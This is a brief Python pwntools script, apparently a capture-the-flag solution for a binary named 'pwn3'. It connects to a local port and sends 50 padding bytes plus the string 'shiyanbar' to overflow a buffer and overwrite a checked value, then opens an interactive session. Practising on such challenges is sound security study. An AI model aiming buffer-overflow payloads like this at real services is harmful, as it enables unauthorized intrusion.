from pwn import *

context(log_level="debug")

# p = process('./pwn3')
p =  remote('127.0.0.1',10087)
p.recvuntil('\n')
payload = 'a'*50+'shiyanbar\0'
p.sendline(payload)
p.interactive()